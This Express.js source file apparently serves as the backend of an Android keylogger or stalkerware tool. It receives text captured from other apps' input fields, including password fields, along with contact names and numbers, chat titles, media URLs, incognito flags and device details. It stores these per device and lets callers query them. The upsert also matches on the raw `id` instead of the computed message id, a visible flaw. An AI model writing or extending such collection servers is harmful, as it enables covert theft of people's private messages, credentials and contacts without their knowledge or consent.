const express = require('express');
const router = express.Router();
const TextInput = require('../models/TextInput');
const { authenticateApiKey } = require('../middleware/auth');

// POST /api/text-inputs - Save text input
router.post('/', authenticateApiKey, async (req, res) => {
    try {
        const {
            id,
            timestamp,
            packageName,
            appName,
            className,
            viewId,
            text,
            beforeText,
            addedText,
            removedText,
            eventType,
            isPassword,
            contentDescription,
            deviceId,
            messageId,
            // Contact Information
            contactName,
            contactNumber,
            contactId,
            recipientInfo,
            chatTitle,
            isGroupChat,
            participantCount,
            // Media attachment information
            hasMedia,
            mediaType,
            mediaUri,
            mediaFileName,
            mediaSize,
            mediaMimeType,
            mediaUploaded,
            mediaServerPath,
            mediaDownloadUrl,
            isMediaAction,
            mediaActionType,
            // Enhanced UI Information
            viewBounds,
            viewRect,
            isEditable,
            isClickable,
            isFocusable,
            isLongClickable,
            isScrollable,
            isSelected,
            isEnabled,
            isVisible,
            isAccessibilityFocused,
            isFocused,
            // Text Properties
            textSize,
            textColor,
            textSelectionStart,
            textSelectionEnd,
            textLength,
            textHint,
            textInputType,
            // View Hierarchy
            parentViewId,
            parentClassName,
            childCount,
            viewIndex,
            viewDepth,
            // Screen Information
            screenWidth,
            screenHeight,
            screenDensity,
            orientation,
            // App Context
            appVersion,
            appVersionCode,
            targetSdkVersion,
            minSdkVersion,
            // Device Information
            deviceModel,
            deviceBrand,
            androidVersion,
            apiLevel,
            deviceLanguage,
            deviceTimezone,
            // Network Information
            networkType,
            isWifiConnected,
            isMobileDataConnected,
            // Battery Information
            batteryLevel,
            isCharging,
            batteryHealth,
            // Memory Information
            availableMemory,
            totalMemory,
            memoryUsagePercent,
            // Performance Metrics
            captureLatency,
            processingTime,
            // Additional Context
            windowTitle,
            windowType,
            isSystemWindow,
            isDialog,
            isPopup,
            isModal,
            // User Interaction Context
            touchAction,
            gestureType,
            interactionTime,
            userSessionId,
            // Security Context
            isSecureContext,
            isIncognito,
            isPrivateMode,
            // Accessibility Context
            accessibilityRole,
            accessibilityDescription: accessibilityDesc,
            accessibilityHint,
            accessibilityLabel,
            accessibilityLiveRegion,
            accessibilityHeading,
            accessibilityImportant,
            // Custom Metadata
            customMetadata,
            tags,
            priority,
            category,
            subcategory,
            // Quality Metrics
            confidence,
            quality,
            isComplete,
            hasErrors,
            errorMessage
        } = req.body;

        // Validate required fields
        if (!id || !packageName || !appName || !text || !eventType || !deviceId) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: id, packageName, appName, text, eventType, deviceId'
            });
        }

        // Build id from messageId when provided to keep one record per message
        const effectiveId = (req.body.customMetadata && req.body.customMetadata.messageId)
            ? `${packageName}:${req.body.customMetadata.messageId}`
            : id;

        // Create comprehensive text input data
        const textInputData = {
            id: effectiveId,
            timestamp: timestamp ? new Date(timestamp) : new Date(),
            packageName,
            appName,
            className,
            viewId,
            text,
            beforeText,
            addedText,
            removedText,
            eventType,
            isPassword: isPassword || false,
            contentDescription,
            deviceId,
            messageId,
            // Contact Information
            contactName: contactName || '',
            contactNumber: contactNumber || '',
            contactId: contactId || '',
            recipientInfo: recipientInfo || '',
            chatTitle: chatTitle || '',
            isGroupChat: isGroupChat || false,
            participantCount: participantCount || 0,
            // Media attachment information
            hasMedia: hasMedia || false,
            mediaType: mediaType || '',
            mediaUri: mediaUri || '',
            mediaFileName: mediaFileName || '',
            mediaSize: mediaSize || 0,
            mediaMimeType: mediaMimeType || '',
            mediaUploaded: mediaUploaded || false,
            mediaServerPath: mediaServerPath || '',
            mediaDownloadUrl: mediaDownloadUrl || '',
            isMediaAction: isMediaAction || false,
            mediaActionType: mediaActionType || '',
            // Enhanced UI Information
            viewBounds,
            viewRect,
            isEditable: isEditable || false,
            isClickable: isClickable || false,
            isFocusable: isFocusable || false,
            isLongClickable: isLongClickable || false,
            isScrollable: isScrollable || false,
            isSelected: isSelected || false,
            isEnabled: isEnabled !== undefined ? isEnabled : true,
            isVisible: isVisible !== undefined ? isVisible : true,
            isAccessibilityFocused: isAccessibilityFocused || false,
            isFocused: isFocused || false,
            // Text Properties
            textSize,
            textColor,
            textSelectionStart,
            textSelectionEnd,
            textLength: textLength || text.length,
            textHint,
            textInputType,
            // View Hierarchy
            parentViewId,
            parentClassName,
            childCount: childCount || 0,
            viewIndex: viewIndex || 0,
            viewDepth: viewDepth || 0,
            // Screen Information
            screenWidth: screenWidth || 0,
            screenHeight: screenHeight || 0,
            screenDensity: screenDensity || 0,
            orientation,
            // App Context
            appVersion,
            appVersionCode,
            targetSdkVersion,
            minSdkVersion,
            // Device Information
            deviceModel,
            deviceBrand,
            androidVersion,
            apiLevel: apiLevel || 0,
            deviceLanguage,
            deviceTimezone,
            // Network Information
            networkType,
            isWifiConnected: isWifiConnected || false,
            isMobileDataConnected: isMobileDataConnected || false,
            // Battery Information
            batteryLevel: batteryLevel || 0,
            isCharging: isCharging || false,
            batteryHealth,
            // Memory Information
            availableMemory: availableMemory || 0,
            totalMemory: totalMemory || 0,
            memoryUsagePercent: memoryUsagePercent || 0,
            // Performance Metrics
            captureLatency: captureLatency || 0,
            processingTime: processingTime || 0,
            // Additional Context
            windowTitle,
            windowType,
            isSystemWindow: isSystemWindow || false,
            isDialog: isDialog || false,
            isPopup: isPopup || false,
            isModal: isModal || false,
            // User Interaction Context
            touchAction,
            gestureType,
            interactionTime: interactionTime || Date.now(),
            userSessionId,
            // Security Context
            isSecureContext: isSecureContext || false,
            isIncognito: isIncognito || false,
            isPrivateMode: isPrivateMode || false,
            // Accessibility Context
            accessibilityRole,
            accessibilityDescription: accessibilityDesc,
            accessibilityHint,
            accessibilityLabel,
            accessibilityLiveRegion,
            accessibilityHeading: accessibilityHeading || false,
            accessibilityImportant: accessibilityImportant || false,
            // Custom Metadata
            customMetadata: customMetadata || {},
            tags: tags || [],
            priority: priority || 0,
            category,
            subcategory,
            // Quality Metrics
            confidence: confidence || 1.0,
            quality: quality || "good",
            isComplete: isComplete !== undefined ? isComplete : true,
            hasErrors: hasErrors || false,
            errorMessage
        };

        // Upsert by id so multiple captures for same message update the same record
        const textInput = await TextInput.findOneAndUpdate(
            { id },
            { $set: textInputData, $setOnInsert: { createdAt: new Date() } },
            { upsert: true, new: true }
        );

        res.status(201).json({
            success: true,
            message: 'Text input saved successfully',
            data: {
                id: textInput.id,
                timestamp: textInput.timestamp,
                packageName: textInput.packageName,
                appName: textInput.appName,
                eventType: textInput.eventType
            }
        });

    } catch (error) {
        console.error('Error saving text input:', error);
        
        if (error.code === 11000) {
            // With upsert this should be rare, but handle gracefully
            return res.status(200).json({ success: true, message: 'Duplicate ignored (already saved)', duplicate: true });
        } else {
            res.status(500).json({
                success: false,
                message: 'Internal server error',
                error: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
            });
        }
    }
});

// GET /api/text-inputs - Fetch text inputs
router.get('/', authenticateApiKey, async (req, res) => {
    try {
        const {
            deviceId,
            packageName,
            limit = 100,
            offset = 0,
            startDate,
            endDate,
            eventType
        } = req.query;

        // Build query
        const query = {};
        
        if (deviceId) {
            query.deviceId = deviceId;
        }
        
        if (packageName) {
            query.packageName = packageName;
        }
        
        if (eventType) {
            query.eventType = eventType;
        }
        
        if (startDate || endDate) {
            query.timestamp = {};
            if (startDate) query.timestamp.$gte = new Date(startDate);
            if (endDate) query.timestamp.$lte = new Date(endDate);
        }

        // Execute query
        const textInputs = await TextInput.find(query)
            .sort({ timestamp: -1 })
            .limit(parseInt(limit))
            .skip(parseInt(offset))
            .select('-__v');

        // Get total count for pagination
        const totalCount = await TextInput.countDocuments(query);

        res.json({
            success: true,
            data: textInputs,
            pagination: {
                total: totalCount,
                limit: parseInt(limit),
                offset: parseInt(offset),
                hasMore: (parseInt(offset) + textInputs.length) < totalCount
            }
        });

    } catch (error) {
        console.error('Error fetching text inputs:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
        });
    }
});

// GET /api/text-inputs/stats - Get text input statistics
router.get('/stats', authenticateApiKey, async (req, res) => {
    try {
        const { deviceId, packageName } = req.query;

        const matchQuery = {};
        if (deviceId) matchQuery.deviceId = deviceId;
        if (packageName) matchQuery.packageName = packageName;

        const stats = await TextInput.aggregate([
            { $match: matchQuery },
            {
                $group: {
                    _id: null,
                    totalTextInputs: { $sum: 1 },
                    uniqueApps: { $addToSet: '$packageName' },
                    uniqueDevices: { $addToSet: '$deviceId' },
                    eventTypes: { $addToSet: '$eventType' }
                }
            },
            {
                $project: {
                    totalTextInputs: 1,
                    uniqueAppsCount: { $size: '$uniqueApps' },
                    uniqueDevicesCount: { $size: '$uniqueDevices' },
                    uniqueApps: 1,
                    uniqueDevices: 1,
                    eventTypes: 1
                }
            }
        ]);

        const result = stats.length > 0 ? stats[0] : {
            totalTextInputs: 0,
            uniqueAppsCount: 0,
            uniqueDevicesCount: 0,
            uniqueApps: [],
            uniqueDevices: [],
            eventTypes: []
        };

        res.json({
            success: true,
            data: result
        });

    } catch (error) {
        console.error('Error fetching text input stats:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
        });
    }
});

module.exports = router;
